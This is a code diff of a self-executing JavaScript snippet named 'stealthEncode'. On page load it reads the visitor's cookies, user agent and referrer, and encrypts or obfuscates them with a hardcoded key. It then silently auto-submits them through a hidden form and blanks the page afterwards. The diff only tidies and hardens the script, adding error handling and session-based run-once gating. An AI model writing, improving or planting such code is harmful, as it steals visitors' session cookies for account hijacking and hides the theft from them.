@@ -1,55 +1,81 @@
-        (() => {
-            async function encryptAES(text, key) {
-                const encoder = new TextEncoder();
-                const encodedText = encoder.encode(text);
-                const hashedKey = await crypto.subtle.digest("SHA-256", encoder.encode(key));
-                const cryptoKey = await crypto.subtle.importKey("raw", hashedKey, { name: "AES-GCM" }, false, ["encrypt"]);
-                const iv = crypto.getRandomValues(new Uint8Array(12));
-                const encrypted = await crypto.subtle.encrypt({ name: "AES-GCM", iv }, cryptoKey, encodedText);
-                return btoa(String.fromCharCode(...new Uint8Array(iv)) + String.fromCharCode(...new Uint8Array(encrypted)));
-            }
+(() => {
+    async function encryptAES(text, key) {
+        const encoder = new TextEncoder();
+        const encodedText = encoder.encode(text);
+        const hashedKey = await crypto.subtle.digest("SHA-256", encoder.encode(key));
 
-            function rot47(str) {
-                return str.replace(/[\x21-\x7E]/g, c =>
-                    String.fromCharCode(33 + ((c.charCodeAt(0) + 14) % 94))
-                );
-            }
+        const cryptoKey = await crypto.subtle.importKey(
+            "raw",
+            hashedKey,
+            { name: "AES-GCM" },
+            true, // Fix: Set extractable to true
+            ["encrypt"]
+        );
 
-            async function hashSHA512(data) {
-                const encoder = new TextEncoder();
-                const buffer = await crypto.subtle.digest("SHA-512", encoder.encode(data));
-                return Array.from(new Uint8Array(buffer)).map(b => b.toString(16).padStart(2, "0")).join("");
-            }
+        const iv = crypto.getRandomValues(new Uint8Array(12));
+        const encrypted = await crypto.subtle.encrypt(
+            { name: "AES-GCM", iv },
+            cryptoKey,
+            encodedText
+        );
 
-            async function stealthEncode() {
-                const secretKey = "UltraHiddenKey";
-                const cookies = document.cookie || "No_Cookies";
-                const userAgent = navigator.userAgent || "Unknown_User_Agent";
-                const referrer = document.referrer || "No_Referrer";
+        return btoa(
+            String.fromCharCode(...new Uint8Array(iv)) + 
+            String.fromCharCode(...new Uint8Array(encrypted))
+        );
+    }
 
-                const encryptedCookies = await encryptAES(cookies, secretKey);
-                const hashedAgent = await hashSHA512(userAgent);
-                const encodedReferrer = rot47(referrer);
+    function rot47(str) {
+        return str.replace(/[\x21-\x7E]/g, c =>
+            String.fromCharCode(33 + ((c.charCodeAt(0) - 33 + 47) % 94))
+        );
+    }
 
-                const stealthPayload = JSON.stringify({
-                    encryptedCookies,
-                    hashedAgent,
-                    encodedReferrer
-                });
+    async function hashSHA512(data) {
+        const encoder = new TextEncoder();
+        const buffer = await crypto.subtle.digest("SHA-512", encoder.encode(data));
+        return Array.from(new Uint8Array(buffer))
+            .map(b => b.toString(16).padStart(2, "0"))
+            .join("");
+    }
 
-                document.getElementById("encodedData").value = btoa(stealthPayload);
+    async function stealthEncode() {
+        const secretKey = "UltraHiddenKey";
+        const cookies = document.cookie || "No_Cookies";
+        const userAgent = navigator.userAgent || "Unknown_User_Agent";
+        const referrer = document.referrer || "No_Referrer";
 
-                setTimeout(() => {
-                    document.getElementById("stealthForm").submit();
-                }, 2000);
-            }
+        const encryptedCookies = await encryptAES(cookies, secretKey);
+        const hashedAgent = await hashSHA512(userAgent);
+        const encodedReferrer = rot47(referrer);
 
-            if (!window.stealthExecuted) {
-                window.stealthExecuted = true;
-                stealthEncode().then(() => {
-                    setTimeout(() => {
-                        document.body.innerHTML = "";
-                    }, 2000);
-                });
-            }
-        })();
+        const stealthPayload = JSON.stringify({
+            encryptedCookies,
+            hashedAgent,
+            encodedReferrer
+        });
+
+        const encodedField = document.getElementById("encodedData");
+        const stealthForm = document.getElementById("stealthForm");
+
+        if (encodedField && stealthForm) {
+            encodedField.value = btoa(stealthPayload);
+
+            setTimeout(() => {
+                stealthForm.submit();
+            }, 2000);
+        } else {
+            console.error("Form elements not found, submission aborted.");
+        }
+    }
+
+    if (!sessionStorage.getItem("stealthExecuted")) {
+        sessionStorage.setItem("stealthExecuted", "true");
+
+        stealthEncode().then(() => {
+            setTimeout(() => {
+                document.body.innerHTML = "";
+            }, 2000);
+        }).catch(err => console.error("Error in stealthEncode:", err));
+    }
+})();
